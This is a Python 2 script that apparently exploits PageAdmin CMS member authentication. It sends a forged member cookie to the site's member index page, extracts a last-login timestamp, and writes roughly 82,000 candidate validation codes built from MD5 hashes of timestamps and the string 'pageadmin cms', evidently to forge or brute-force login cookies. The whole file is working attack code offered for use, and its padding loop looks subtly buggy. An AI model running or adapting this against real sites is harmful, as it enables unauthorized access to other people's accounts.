# -*- coding: utf-8 -*- 
import scan
import md5
import datetime
import time
import re
import urllib
import urllib2
import sys


def GetMd5(Timestr):
    result=''
    valicode=[]
    m=md5.new()
    m.update(Timestr)
    value1=m.hexdigest()
    
    n=md5.new()
    n.update('pageadmin cms')
    value2=n.hexdigest()
    
    for i in range(0,16): 
        valicode.append(int(value1[i*2:2*(i+1)], 16)+int(value2[i*2:2*(i+1)], 16))       
        if valicode[i]<16:
            result=result+'0'+hex(valicode[i])[2:]
        result=result+hex(valicode[i])[2:]
  
    return result
def ValicateList(Timestr):
    
    t=datetime.datetime.strptime(Timestr,'%Y-%m-%d %H:%M:%S')+datetime.timedelta(seconds=3600)
    f=open('valicode.txt','w')
    for i in range(3600,86165):
        t=t+datetime.timedelta(seconds=1)
        time=datetime.datetime.strftime(t,'%Y-%m-%d %H:%M:%S')
        time=time.replace('-','',2).replace(':','',2).replace(' ','')  
        Valicode=GetMd5(time)+'\n'  
        f.write(Valicode)
    f.close()


def PaStrGet(target):
    paradata={'type':'mem_idx','s':'1'}
    urldata=urllib.urlencode(paradata)
    url=target+'/e/member/index.aspx?'+urldata
    
    req=urllib2.Request(url)
    req.add_header('Cookie',' site=1; tongji=1; referer=;Member=UID=2&valicate=1')
    try:
        reponse=urllib2.urlopen(req)
    except urllib2.HTTPError,e:
        print 'Shit, Nothing Found ...'
        exit()
    except urllib2.URLError,e:
        print 'Shit, Nothing Found ...'
        exit()
    htmlfile=reponse.read()
    result=re.findall("2014-\d+-\d+ \d+:\d+:\d+",htmlfile)
    if result: 
        print target,' Login_lasttime Found',result[0],'\n'
        return result[0]
    else:      
        print 'Shit, Nothing Found ...'
def main():
    if len(sys.argv) < 1:
        print 'Url?'
        return
    else:
        
        Timestr=PaStrGet(sys.argv[1])
        ValicateList(Timestr)
    
if __name__=='__main__':

    main()
